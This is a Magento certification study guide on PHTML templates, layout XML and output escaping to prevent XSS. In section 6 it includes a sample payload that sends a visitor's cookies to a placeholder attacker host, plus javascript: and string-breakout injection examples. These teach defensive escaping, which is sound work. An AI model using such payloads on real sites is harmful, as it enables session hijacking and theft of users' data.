# Day 6 — PHTML Templates & Template Security

## Table of Contents
- [1. Overview](#1-overview)
- [2. Template Resolution & Fallback](#2-template-resolution--fallback)
- [3. Creating Custom Templates](#3-creating-custom-templates)
- [4. Assigning Templates via Layout XML](#4-assigning-templates-via-layout-xml)
- [5. Block Methods Available in Templates](#5-block-methods-available-in-templates)
- [6. Template Security — Escaping Output](#6-template-security--escaping-output)
  - [6.1 escapeHtml()](#61-escapehtml)
  - [6.2 escapeUrl()](#62-escapeurl)
  - [6.3 escapeJs()](#63-escapejs)
  - [6.4 escapeCss()](#64-escapecss)
  - [6.5 escapeHtmlAttr()](#65-escapehtmlattr)
  - [6.6 Choosing the Right Escape Method](#66-choosing-the-right-escape-method)
- [7. Escape Annotation Comments](#7-escape-annotation-comments)
- [8. XSS Prevention Patterns](#8-xss-prevention-patterns)
- [9. Hands-On Walkthrough](#9-hands-on-walkthrough)
- [10. Quick-Reference Checklist](#10-quick-reference-checklist)

---

## 1. Overview

PHTML (PHP + HTML) templates are the **view layer** of Adobe Commerce's MVC architecture. They render the HTML output for blocks defined in layout XML. Understanding how Magento finds, loads, and secures templates is essential for both theme development and the certification exam.

```
+--------------------+     Layout XML      +--------------------+
|   Layout XML       | ------------------> |   Block (PHP)      |
|  (page structure)  |                     |  (data & logic)    |
+--------------------+                     +--------------------+
                                                    |
                                           template argument
                                                    |
                                                    v
                                           +--------------------+
                                           |  PHTML Template    |
                                           |  (HTML + PHP)      |
                                           +--------------------+
                                                    |
                                                    v
                                           +--------------------+
                                           |  HTML Response     |
                                           +--------------------+
```

---

## 2. Template Resolution & Fallback

### How Magento Finds Template Files

Magento uses a **hierarchical fallback chain** to resolve which template file to render. The system walks up the chain and uses the first match it finds.

```
Priority (highest first):
1. Current Theme                  app/design/frontend/<Vendor>/<Theme>/
2. Parent Theme(s)                (if theme inherits from another)
3. Module View Directory          app/code/<Vendor>/<Module>/view/frontend/templates/
4. Module (installed via Composer) vendor/<vendor>/<module>/view/frontend/templates/
```

### Full Fallback Path for a Template

For a block referencing `Magento_Catalog::product/view/info.phtml`:

```
Step 1: app/design/frontend/<Vendor>/<Theme>/Magento_Catalog/templates/product/view/info.phtml
Step 2: app/design/frontend/<Vendor>/<ParentTheme>/Magento_Catalog/templates/product/view/info.phtml
Step 3: app/code/Magento/Catalog/view/frontend/templates/product/view/info.phtml
Step 4: vendor/magento/module-catalog/view/frontend/templates/product/view/info.phtml
```

> **Exam focus:** The template string format is `<Vendor_Module>::<path/to/template.phtml>`. The double colon (`::`) separates the module identifier from the relative template path. The `templates/` directory prefix is **implied** and NOT written in the string.

### Template String Anatomy

```
Magento_Catalog::product/view/info.phtml
|______________|  |________________________|
  Module ID          Relative path under
                     view/frontend/templates/
```

### Directory Structure Inside a Module

```
app/code/MyVendor/MyModule/
+-- view/
    +-- frontend/
        +-- templates/
            +-- mytemplate.phtml
            +-- product/
                +-- detail.phtml
```

### Directory Structure Inside a Theme (Override)

```
app/design/frontend/MyVendor/mytheme/
+-- MyVendor_MyModule/
    +-- templates/
        +-- mytemplate.phtml       <-- overrides module template
```

**Exam focus:** To override a module's template in a theme, place your file at `<theme>/<Vendor_Module>/templates/<same-relative-path>.phtml`. The `view/frontend/` segment is **omitted** in the theme path.

---

## 3. Creating Custom Templates

### Step 1 — Create the Template File

For a module-level template:

```
app/code/MyVendor/MyModule/view/frontend/templates/hello.phtml
```

```php
<?php
/** @var \MyVendor\MyModule\Block\Hello $block */
/** @var \Magento\Framework\Escaper $escaper */
?>
<div class="hello-block">
    <h2><?= $block->escapeHtml($block->getTitle()) ?></h2>
    <p><?= $block->escapeHtml($block->getMessage()) ?></p>
</div>
```

### Step 2 — Create the Block Class

```php
<?php
// app/code/MyVendor/MyModule/Block/Hello.php

namespace MyVendor\MyModule\Block;

use Magento\Framework\View\Element\Template;

class Hello extends Template
{
    /**
     * @return string
     */
    public function getTitle(): string
    {
        return (string) $this->getData('title');
    }

    /**
     * @return string
     */
    public function getMessage(): string
    {
        return (string) $this->getData('message');
    }
}
```

> **Exam focus:** All custom blocks that render PHTML should extend `\Magento\Framework\View\Element\Template`. This base class provides access to `$block->escapeHtml()` and all other escape helpers, plus template resolution.

---

## 4. Assigning Templates via Layout XML

### Method 1 — Inline `template` Argument on Block Declaration

```xml
<!-- app/code/MyVendor/MyModule/view/frontend/layout/cms_index_index.xml -->
<?xml version="1.0"?>
<page xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
      xsi:noNamespaceSchemaLocation="urn:magento:framework:View/Layout/etc/page_configuration.xsd">
    <body>
        <referenceContainer name="content">
            <block class="MyVendor\MyModule\Block\Hello"
                   name="myvendor.hello"
                   template="MyVendor_MyModule::hello.phtml">
                <arguments>
                    <argument name="title" xsi:type="string">Hello World</argument>
                    <argument name="message" xsi:type="string">Welcome to my block</argument>
                </arguments>
            </block>
        </referenceContainer>
    </body>
</page>
```

### Method 2 — `referenceBlock` to Change an Existing Block's Template

```xml
<?xml version="1.0"?>
<page xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
      xsi:noNamespaceSchemaLocation="urn:magento:framework:View/Layout/etc/page_configuration.xsd">
    <body>
        <referenceBlock name="product.info.sku">
            <action method="setTemplate">
                <argument name="template" xsi:type="string">
                    MyVendor_MyModule::product/custom-sku.phtml
                </argument>
            </action>
        </referenceBlock>
    </body>
</page>
```

### Method 3 — `<arguments>` with `template` Argument (Preferred)

```xml
<referenceBlock name="product.info.sku">
    <arguments>
        <argument name="template" xsi:type="string">
            MyVendor_MyModule::product/custom-sku.phtml
        </argument>
    </arguments>
</referenceBlock>
```

> **Exam focus:** Using `<argument name="template" ...>` inside `<arguments>` is the **modern, preferred** approach. The `<action method="setTemplate">` approach works but is considered legacy. Both are valid and may appear on the exam.

---

## 5. Block Methods Available in Templates

Inside a `.phtml` file, `$block` is the instance of the Block class associated with the template.

### Core Template Methods

| Method | Description | Example |
|---|---|---|
| `$block->getData($key)` | Get arbitrary data set on the block | `$block->getData('title')` |
| `$block->setData($key, $val)` | Set a data value on the block | `$block->setData('foo', 'bar')` |
| `$block->hasData($key)` | Check if data key exists | `$block->hasData('title')` |
| `$block->getChildHtml($alias)` | Render a child block's HTML | `$block->getChildHtml('child.name')` |
| `$block->getChildBlock($alias)` | Get child block object | `$block->getChildBlock('child.name')` |
| `$block->getParentBlock()` | Get the parent block object | — |
| `$block->getUrl($route, $params)` | Generate a store URL | `$block->getUrl('catalog/product/view')` |
| `$block->getViewFileUrl($path)` | Get static asset URL | `$block->getViewFileUrl('MyVendor_M::js/foo.js')` |
| `$block->getBaseUrl()` | Get the store base URL | — |
| `$block->getNameInLayout()` | Get the block's layout name | — |
| `$block->toHtml()` | Force render the block | — |
| `$block->getTemplate()` | Return assigned template path | — |

### Magic Getters/Setters

Magento's `\Magento\Framework\DataObject` (parent of blocks) provides magic methods:

```php
// These are equivalent:
$block->getData('product_id');
$block->getProductId();          // magic getter: getXxx() => getData('xxx')

// Also equivalent:
$block->setData('is_enabled', true);
$block->setIsEnabled(true);      // magic setter: setXxx() => setData('xxx', val)
```

> **Exam focus:** Magic getters/setters are camelCase translations of snake_case data keys. `getProductId()` maps to `getData('product_id')`.

### Using `getChildHtml()`

```php
<?php
/** @var \Magento\Framework\View\Element\Template $block */
?>
<div class="wrapper">
    <?= $block->getChildHtml('toolbar') ?>
    <?= $block->getChildHtml('listing') ?>

    <?php /* Render ALL children */ ?>
    <?= $block->getChildHtml() ?>
</div>
```

```xml
<!-- Layout XML to define children -->
<block class="Magento\Framework\View\Element\Template"
       name="my.parent.block"
       template="MyVendor_MyModule::wrapper.phtml">
    <block class="Magento\Framework\View\Element\Template"
           name="toolbar"
           as="toolbar"
           template="MyVendor_MyModule::toolbar.phtml"/>
    <block class="Magento\Framework\View\Element\Template"
           name="listing"
           as="listing"
           template="MyVendor_MyModule::listing.phtml"/>
</block>
```

> **Exam focus:** The `as` attribute in layout XML defines the **alias** used in `getChildHtml($alias)`. If `as` is omitted, the `name` attribute is used as the alias.

### Accessing the Escaper Object Directly

```php
<?php
/** @var \Magento\Framework\Escaper $escaper */
// $escaper is auto-injected into templates as of Magento 2.4
?>
<p><?= $escaper->escapeHtml($someVariable) ?></p>
```

> **Exam focus:** As of Magento 2.4+, `$escaper` is available as a standalone variable in PHTML templates (injected by the template engine). Using `$escaper->escapeHtml()` is preferred over `$block->escapeHtml()` in newer code, though both work. Older code uses `$block->escapeHtml()`.

---

## 6. Template Security — Escaping Output

### Why Escaping Matters

Without proper escaping, user-controlled data rendered in HTML creates **Cross-Site Scripting (XSS)** vulnerabilities. XSS allows attackers to inject malicious JavaScript into pages viewed by other users — including administrators.

```
UNSAFE (XSS vulnerability):
    <p><?= $block->getData('user_input') ?></p>

    If user_input = <script>document.location='https://evil.com?c='+document.cookie</script>
    -> Browser executes the injected script!

SAFE:
    <p><?= $block->escapeHtml($block->getData('user_input')) ?></p>

    Output: &lt;script&gt;document.location=...&lt;/script&gt;
    -> Browser renders it as text, not code.
```

---

### 6.1 `escapeHtml()`

**Use for:** Any dynamic value output inside **HTML content** (between tags, NOT in attributes).

**Signature:**
```php
escapeHtml(string|array $data, array $allowedTags = []): string
```

**What it does:** Converts special HTML characters to their entities:
- `<` → `&lt;`
- `>` → `&gt;`
- `"` → `&quot;`
- `'` → `&#039;`
- `&` → `&amp;`

**Examples:**

```php
<?php
/** @var \Magento\Framework\View\Element\Template $block */
/** @var \Magento\Framework\Escaper $escaper */

// Basic HTML content escaping
$name = $block->getData('customer_name');
?>

<!-- CORRECT -->
<h1><?= $escaper->escapeHtml($name) ?></h1>

<!-- With allowed HTML tags (e.g., for CMS content) -->
<div><?= $escaper->escapeHtml($block->getDescription(), ['b', 'em', 'strong', 'a']) ?></div>

<!-- Arrays are escaped recursively -->
<?php $tags = $escaper->escapeHtml(['<script>', 'safe', '<b>bold</b>']); ?>
```

> **Exam focus:** `escapeHtml()` accepts an **optional second argument** — an array of allowed HTML tags. Tags in this whitelist are preserved; all other tags are stripped/escaped. This is commonly used for product descriptions that may contain basic formatting.

---

### 6.2 `escapeUrl()`

**Use for:** URLs rendered in `href`, `src`, `action`, or any attribute that takes a URL value.

**Signature:**
```php
escapeUrl(string $string): string
```

**What it does:**
- Calls `escapeHtml()` on the URL
- Additionally removes `javascript:` and `vbscript:` protocol schemes to prevent protocol-based XSS

**Examples:**

```php
<?php
$url = $block->getUrl('catalog/product/view', ['id' => $product->getId()]);
$externalUrl = $block->getData('redirect_url'); // User-supplied, potentially malicious
?>

<!-- CORRECT: URL in href -->
<a href="<?= $escaper->escapeUrl($url) ?>">View Product</a>

<!-- CRITICAL: Always escape user-supplied URLs -->
<a href="<?= $escaper->escapeUrl($externalUrl) ?>">Click here</a>
```

**Why it blocks `javascript:` attacks:**

```
User input:    javascript:alert(document.cookie)
After escape:  (scheme stripped/escaped — link becomes safe)
```

> **Exam focus:** `escapeUrl()` is specifically designed to **prevent protocol injection** (e.g., `javascript:` URLs). Use it for ALL URL values in HTML attributes. Do NOT use `escapeHtml()` alone for URLs.

---

### 6.3 `escapeJs()`

**Use for:** Dynamic values injected inside `<script>` blocks or inline JavaScript strings.

**Signature:**
```php
escapeJs(string $string): string
```

**What it does:**
- Encodes the string using JSON encoding for safe embedding in a JavaScript context
- Escapes characters that could break out of a JavaScript string literal
- Converts non-ASCII characters to `\uXXXX` Unicode escapes

**Examples:**

```php
<?php
$customerName = $block->getData('customer_name');   // Could contain quotes, backslashes
$productData  = $block->getData('track_label');
?>

<script>
    // CORRECT: Safe to embed in JS string
    var customerName = '<?= $escaper->escapeJs($customerName) ?>';

    // CORRECT: Prevents breaking out of string context
    var trackLabel = '<?= $escaper->escapeJs($productData) ?>';

    // For passing full objects/arrays to JS, use JSON:
    var config = <?= /* @noEscape */ json_encode($block->getJsConfig()) ?>;
</script>
```

**What it prevents:**

```
User input:      O'Brien'; alert('xss');//
Without escape:  var name = 'O'Brien'; alert('xss');//'; -> XSS!
With escapeJs(): var name = 'O\u0027Brien\u0027; alert(\u0027xss\u0027);//'; -> Safe
```

> **Exam focus:** `escapeJs()` is for **values inside JavaScript strings**, not for entire script blocks. For JSON data passed to JavaScript (full objects/arrays), use `json_encode()` with `/* @noEscape */` annotation since `json_encode` handles its own encoding.

---

### 6.4 `escapeCss()`

**Use for:** Dynamic values inserted into CSS property values in `<style>` tags or `style` attributes.

**Signature:**
```php
escapeCss(string $string): string
```

**What it does:**
- Escapes characters that could break out of a CSS context or inject CSS expressions
- Allows only safe CSS characters; encodes everything else as `\XXXXXX` (CSS hex escapes)

**Examples:**

```php
<?php
$userColor = $block->getData('brand_color');  // e.g., "#ff0000" or malicious input
$customFont = $block->getData('font_family');
?>

<style>
    /* CORRECT: Safe CSS value injection */
    .brand-header {
        color: <?= $escaper->escapeCss($userColor) ?>;
        font-family: <?= $escaper->escapeCss($customFont) ?>;
    }
</style>

<!-- Also for inline style attributes -->
<div style="color: <?= $escaper->escapeCss($userColor) ?>;">Branded Content</div>
```

> **Exam focus:** `escapeCss()` is the **least commonly tested** but still examined. Remember it is for CSS contexts — both `<style>` blocks and inline `style=""` attributes. CSS injection can be used to exfiltrate data or create phishing UI.

---

### 6.5 `escapeHtmlAttr()`

**Use for:** Dynamic values placed inside HTML attribute values (but NOT URL-type attributes — use `escapeUrl()` for those).

**Signature:**
```php
escapeHtmlAttr(string $string, bool $escapeSingleQuote = true): string
```

**Examples:**

```php
<?php
$title = $block->getData('tooltip_text');
$altText = $block->getData('image_alt');
?>

<!-- CORRECT: Attribute value escaping -->
<img src="<?= $escaper->escapeUrl($imgUrl) ?>"
     alt="<?= $escaper->escapeHtmlAttr($altText) ?>"
     title="<?= $escaper->escapeHtmlAttr($title) ?>"
/>

<!-- In data attributes -->
<div data-label="<?= $escaper->escapeHtmlAttr($label) ?>">...</div>
```

> **Exam focus:** The distinction between `escapeHtml()` and `escapeHtmlAttr()` matters. Use `escapeHtmlAttr()` for HTML attribute values (e.g., `alt=""`, `title=""`, `data-*=""`), and `escapeHtml()` for text node content between tags.

---

### 6.6 Choosing the Right Escape Method

This is the **most exam-tested** area. Memorize this table:

| Output Context | Correct Method | Example Location |
|---|---|---|
| HTML text content (between tags) | `escapeHtml()` | `<p><?= escapeHtml($val) ?></p>` |
| HTML attribute value (non-URL) | `escapeHtmlAttr()` | `alt="<?= escapeHtmlAttr($val) ?>"` |
| URL attribute (`href`, `src`, `action`) | `escapeUrl()` | `href="<?= escapeUrl($url) ?>"` |
| JavaScript string value | `escapeJs()` | `var x = '<?= escapeJs($val) ?>';` |
| CSS property value | `escapeCss()` | `color: <?= escapeCss($color) ?>;` |

```
HTML Document Contexts:

+--------------------------------------------+
|  <html>                                    |
|    <head>                                  |
|      <style>                               |
|         .x { color: [escapeCss()] }  <--  CSS context
|      </style>                              |
|    </head>                                 |
|    <body>                                  |
|      <p>[escapeHtml()]</p>            <-- HTML content
|      <a href="[escapeUrl()]"          <-- URL attribute
|         title="[escapeHtmlAttr()]">   <-- HTML attribute
|      </a>                                  |
|      <script>                              |
|        var x='[escapeJs()]';         <-- JS string
|      </script>                             |
|    </body>                                 |
|  </html>                                   |
+--------------------------------------------+
```

---

## 7. Escape Annotation Comments

When code analysis tools (like Magento's static analysis or the Security Patch Checker) scan for unescaped output, they flag any `echo` or `<?=` without an escape call. These annotations tell the tool the developer has consciously handled the case.

### `/* @noEscape */`

**Meaning:** The developer **confirms** this value is safe and does not need escaping.

**Use when:**
- The value is already escaped upstream
- The value is a fully trusted constant or hard-coded string
- The value is output from `json_encode()` (which handles its own escaping)
- The value is an integer or boolean

```php
<?php
// Integer — no escaping needed
$productId = (int) $block->getProductId();
?>
<div data-id="<?= /* @noEscape */ $productId ?>">...</div>

<?php
// Already escaped upstream
$preEscapedHtml = $block->escapeHtml($rawValue);
?>
<p><?= /* @noEscape */ $preEscapedHtml ?></p>

<?php
// json_encode handles its own encoding
$config = $block->getJsConfig();
?>
<script>
    var config = <?= /* @noEscape */ json_encode($config) ?>;
</script>

<?php
// Trusted method that returns escaped content
?>
<?= /* @noEscape */ $block->getChildHtml('child') ?>
```

---

### `/* @escapeNotVerified */`

**Meaning:** The developer is **not sure** whether this output needs escaping — it is a **TODO marker** indicating the code needs review. It suppresses the static analysis warning temporarily.

**Use when:**
- Migrating legacy code where escape status is unclear
- During development when you need to confirm the data source
- As a temporary suppression while auditing a large file

```php
<?php
// Legacy code — not yet verified safe
$legacyValue = $this->getSomeOldMethod();
?>
<p><?= /* @escapeNotVerified */ $legacyValue ?></p>
```

> **Exam focus:** `/* @noEscape */` means **deliberately not escaped** (intentional, safe). `/* @escapeNotVerified */` means **not yet confirmed** (needs review). These are **code review/static analysis annotations**, not security functions. They have no runtime effect.

**Key Distinction:**

| Annotation | Meaning | Status |
|---|---|---|
| `/* @noEscape */` | Confirmed safe, escape not needed | Intentional ✓ |
| `/* @escapeNotVerified */` | Safety not yet confirmed | Needs audit / TODO |

---

## 8. XSS Prevention Patterns

### Pattern 1 — Secure Product Name Display

```php
<?php
/** @var \Magento\Catalog\Block\Product\View $block */
/** @var \Magento\Framework\Escaper $escaper */
$product = $block->getProduct();
?>
<div class="product-info">
    <!-- Product name: HTML text content -->
    <h1 class="page-title">
        <span><?= $escaper->escapeHtml($product->getName()) ?></span>
    </h1>

    <!-- Product URL: href attribute -->
    <a href="<?= $escaper->escapeUrl($block->getProductUrl()) ?>">
        View Details
    </a>

    <!-- Image with alt text -->
    <img src="<?= $escaper->escapeUrl($block->getImage($product, 'product_base_image')->getImageUrl()) ?>"
         alt="<?= $escaper->escapeHtmlAttr($product->getName()) ?>"
    />
</div>
```

### Pattern 2 — Passing Data to JavaScript

```php
<?php
/** @var \Magento\Framework\View\Element\Template $block */
/** @var \Magento\Framework\Escaper $escaper */
$customerId = (int) $block->getData('customer_id');
$customerName = $block->getData('customer_name');
$jsConfig = $block->getJsConfig(); // Returns array
?>

<script>
require(['jquery'], function($) {
    'use strict';

    // Integer: @noEscape is safe
    var customerId = <?= /* @noEscape */ $customerId ?>;

    // String value in JS context
    var customerName = '<?= $escaper->escapeJs($customerName) ?>';

    // Object/array via json_encode
    var config = <?= /* @noEscape */ json_encode($jsConfig) ?>;

    console.log(customerId, customerName, config);
});
</script>
```

### Pattern 3 — Form Input with User Data

```php
<?php
/** @var \Magento\Framework\Escaper $escaper */
$savedValue = $block->getData('form_value'); // Previously submitted form value
$formAction = $block->getUrl('module/controller/action');
?>

<form action="<?= $escaper->escapeUrl($formAction) ?>" method="post">
    <?= $block->getBlockHtml('formkey') /* @noEscape — internal trusted method */ ?>

    <input type="text"
           name="customer_name"
           value="<?= $escaper->escapeHtmlAttr($savedValue) ?>"
           placeholder="<?= $escaper->escapeHtmlAttr(__('Enter your name')) ?>"
    />
    <button type="submit"><?= $escaper->escapeHtml(__('Submit')) ?></button>
</form>
```

### Pattern 4 — CMS Block with Allowed Tags

```php
<?php
/** @var \Magento\Framework\Escaper $escaper */
$description = $block->getData('product_description'); // May contain basic HTML
?>

<!-- Allow only safe formatting tags -->
<div class="product-description">
    <?= $escaper->escapeHtml($description, ['p', 'br', 'b', 'i', 'em', 'strong', 'ul', 'ol', 'li']) ?>
</div>
```

### Anti-Patterns to Avoid

```php
<?php
// WRONG: No escaping
echo $block->getData('user_input');

// WRONG: Printing URL without escapeUrl (misses javascript: protocol)
?><a href="<?= $escaper->escapeHtml($url) ?>">Link</a><?php
// ^ Should use escapeUrl(), not escapeHtml() for URLs

// WRONG: Using escapeHtml() for JS context
?><script>var x = '<?= $escaper->escapeHtml($value) ?>';</script><?php
// ^ Should use escapeJs() for JS string context

// WRONG: Using escapeHtml() for HTML attributes
?><input value="<?= $escaper->escapeHtml($value) ?>"><?php
// ^ Should use escapeHtmlAttr() (though escapeHtml() is somewhat safer here,
//   escapeHtmlAttr() is the correct method)

// RIGHT:
echo $escaper->escapeHtml($block->getData('user_input'));
?><a href="<?= $escaper->escapeUrl($url) ?>">Link</a><?php
?><script>var x = '<?= $escaper->escapeJs($value) ?>';</script><?php
?><input value="<?= $escaper->escapeHtmlAttr($value) ?>"><?php
```

---

## 9. Hands-On Walkthrough

### Goal: Create a "Featured Message" block with a secure template

#### Step 1 — Module Structure

```
app/code/MyVendor/FeaturedMessage/
+-- Block/
|   +-- Message.php
+-- view/
|   +-- frontend/
|       +-- layout/
|       |   +-- cms_index_index.xml
|       +-- templates/
|           +-- message.phtml
+-- etc/
    +-- module.xml
    +-- registration.php
```

#### Step 2 — Block Class (`Block/Message.php`)

```php
<?php
namespace MyVendor\FeaturedMessage\Block;

use Magento\Framework\View\Element\Template;

class Message extends Template
{
    /**
     * Get the featured message title
     */
    public function getTitle(): string
    {
        return (string) $this->getData('title');
    }

    /**
     * Get the message body (may contain HTML)
     */
    public function getMessageBody(): string
    {
        return (string) $this->getData('body');
    }

    /**
     * Get the call-to-action URL
     */
    public function getCtaUrl(): string
    {
        return (string) $this->getData('cta_url');
    }

    /**
     * Get JS tracking config
     */
    public function getTrackingConfig(): array
    {
        return [
            'event'    => 'featured_message_view',
            'block_id' => $this->getNameInLayout(),
            'title'    => $this->getTitle(),
        ];
    }
}
```

#### Step 3 — Layout XML (`view/frontend/layout/cms_index_index.xml`)

```xml
<?xml version="1.0"?>
<page xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
      xsi:noNamespaceSchemaLocation="urn:magento:framework:View/Layout/etc/page_configuration.xsd">
    <body>
        <referenceContainer name="content">
            <block class="MyVendor\FeaturedMessage\Block\Message"
                   name="featured.message"
                   template="MyVendor_FeaturedMessage::message.phtml"
                   before="-">
                <arguments>
                    <argument name="title" xsi:type="string">Summer Sale 2024</argument>
                    <argument name="body" xsi:type="string">
                        Get &lt;strong&gt;50% off&lt;/strong&gt; on all items this weekend only!
                    </argument>
                    <argument name="cta_url" xsi:type="string">https://example.com/sale</argument>
                </arguments>
            </block>
        </referenceContainer>
    </body>
</page>
```

#### Step 4 — PHTML Template (`view/frontend/templates/message.phtml`)

```php
<?php
/**
 * @var \MyVendor\FeaturedMessage\Block\Message $block
 * @var \Magento\Framework\Escaper $escaper
 */

// Retrieve data from block
$title      = $block->getTitle();
$body       = $block->getMessageBody();
$ctaUrl     = $block->getCtaUrl();
$config     = $block->getTrackingConfig();
?>
<section class="featured-message" data-mage-init='{"featuredMessage": {}}'>

    <!-- ============================================================
         1. HTML TEXT CONTENT -> escapeHtml()
         ============================================================ -->
    <h2 class="featured-message__title">
        <?= $escaper->escapeHtml($title) ?>
    </h2>

    <!-- ============================================================
         2. HTML CONTENT WITH ALLOWED TAGS -> escapeHtml($val, $tags)
         ============================================================ -->
    <div class="featured-message__body">
        <?= $escaper->escapeHtml($body, ['strong', 'em', 'b', 'i', 'br']) ?>
    </div>

    <!-- ============================================================
         3. URL ATTRIBUTE -> escapeUrl()
         ============================================================ -->
    <a href="<?= $escaper->escapeUrl($ctaUrl) ?>"
       class="action primary">
        <?= $escaper->escapeHtml(__('Shop Now')) ?>
    </a>

    <!-- ============================================================
         4. HTML ATTRIBUTE (non-URL) -> escapeHtmlAttr()
         ============================================================ -->
    <img src="<?= $escaper->escapeUrl($block->getViewFileUrl('MyVendor_FeaturedMessage::images/banner.jpg')) ?>"
         alt="<?= $escaper->escapeHtmlAttr($title) ?>"
         title="<?= $escaper->escapeHtmlAttr(__('Featured Sale Banner')) ?>"
    />

    <!-- ============================================================
         5. CSS VALUE -> escapeCss()
         ============================================================ -->
    <?php $brandColor = $block->getData('brand_color') ?: '#ff5500'; ?>
    <style>
        .featured-message__title {
            color: <?= $escaper->escapeCss($brandColor) ?>;
        }
    </style>

    <!-- ============================================================
         6. JAVASCRIPT STRING -> escapeJs()
         ============================================================ -->
    <script>
    require(['jquery'], function($) {
        'use strict';

        // String in JS context
        var blockTitle = '<?= $escaper->escapeJs($title) ?>';

        // Integer — no escape needed, cast to int
        var blockCount = <?= /* @noEscape */ (int) $block->getData('item_count') ?>;

        // JSON object — json_encode handles its own escaping
        var trackingConfig = <?= /* @noEscape */ json_encode($config) ?>;

        // getChildHtml() returns trusted HTML — @noEscape is appropriate
        console.log('Block loaded:', blockTitle, blockCount, trackingConfig);
    });
    </script>

    <!-- ============================================================
         7. CHILD BLOCK RENDERING -> @noEscape (trusted internal method)
         ============================================================ -->
    <?= /* @noEscape */ $block->getChildHtml('message.actions') ?>

</section>
```

#### Step 5 — Theme Override (Optional)

To override this template in a custom theme without modifying the module:

```
app/design/frontend/MyVendor/mytheme/
+-- MyVendor_FeaturedMessage/
    +-- templates/
        +-- message.phtml    <-- This overrides the module template
```

No layout XML changes needed — Magento's fallback system handles it automatically.

#### Step 6 — Flush Cache

```bash
# After creating new template/layout files
php bin/magento cache:flush

# Or flush specific cache types
php bin/magento cache:clean layout block_html full_page
```

---

## 10. Quick-Reference Checklist

### Template Resolution
- [ ] Template string format: `Vendor_Module::path/to/template.phtml` (no `templates/` in the string)
- [ ] Fallback order: Active Theme → Parent Theme → Module `view/frontend/templates/`
- [ ] To override in a theme: `<theme>/<Vendor_Module>/templates/<same-path>.phtml`
- [ ] Theme path omits `view/frontend/` segment; module path includes it

### Layout XML — Template Assignment
- [ ] Assign on block declaration: `template="Vendor_Module::template.phtml"` attribute
- [ ] Assign via arguments: `<argument name="template" xsi:type="string">...</argument>` (preferred)
- [ ] Legacy method: `<action method="setTemplate">` (still valid, considered legacy)
- [ ] Child block alias: `as="alias"` attribute matches `getChildHtml('alias')` argument

### Block Methods
- [ ] `$block->getData($key)` — get a data property
- [ ] `$block->getChildHtml($alias)` — render a child block (returns HTML string)
- [ ] `$block->getChildBlock($alias)` — get child block object
- [ ] `$block->getUrl($route, $params)` — generate a store URL
- [ ] Magic getter: `getProductId()` ↔ `getData('product_id')` (camelCase ↔ snake_case)
- [ ] `$escaper` variable is auto-available in PHTML templates (Magento 2.4+)

### Escaping Methods — Use Cases
- [ ] `escapeHtml($val)` → HTML text node content between tags
- [ ] `escapeHtml($val, $allowedTags)` → HTML content with whitelisted tags
- [ ] `escapeHtmlAttr($val)` → HTML attribute values (non-URL): `alt=""`, `title=""`, `data-*=""`
- [ ] `escapeUrl($val)` → URL attributes: `href=""`, `src=""`, `action=""` — also strips `javascript:` scheme
- [ ] `escapeJs($val)` → JavaScript string literals inside `<script>` blocks
- [ ] `escapeCss($val)` → CSS property values in `<style>` blocks or `style=""` attributes

### Escape Annotations
- [ ] `/* @noEscape */` — developer confirms output is **intentionally safe**, no escape needed
- [ ] `/* @escapeNotVerified */` — escape status **not confirmed**, needs review (TODO marker)
- [ ] Both annotations are for **static analysis tools only** — they have NO runtime effect
- [ ] `/* @noEscape */` appropriate for: integers, `getChildHtml()`, `json_encode()`, pre-escaped values
- [ ] `/* @escapeNotVerified */` appropriate for: legacy migrations, temporary suppression

### XSS Prevention Rules
- [ ] **Never** output `$block->getData(...)` or request params directly without escaping
- [ ] Use `escapeUrl()` (not `escapeHtml()`) for URL attributes — escapeHtml alone won't strip `javascript:`
- [ ] Use `escapeJs()` (not `escapeHtml()`) inside JavaScript strings
- [ ] Use `json_encode()` + `/* @noEscape */` for passing PHP arrays/objects to JavaScript
- [ ] `escapeHtml()` with allowed tags for CMS/product content that may contain formatting HTML
- [ ] Form inputs repopulated with user data: use `escapeHtmlAttr()` for the `value=""` attribute
- [ ] All blocks should extend `\Magento\Framework\View\Element\Template` for escape method access

### Exam Hotspots
- [ ] The double colon (`::`) separator in template path strings
- [ ] `escapeUrl()` specifically prevents `javascript:` protocol injection — no other method does this
- [ ] The `$escaper` standalone variable vs `$block->escapeHtml()` — both work, `$escaper` is modern
- [ ] `@noEscape` = safe/intentional; `@escapeNotVerified` = unknown/TODO — do NOT mix these up
- [ ] `as=""` attribute in layout XML controls the alias for `getChildHtml()`
- [ ] Template override in theme: omit `view/frontend/` in the path, add `templates/` directly under module folder name
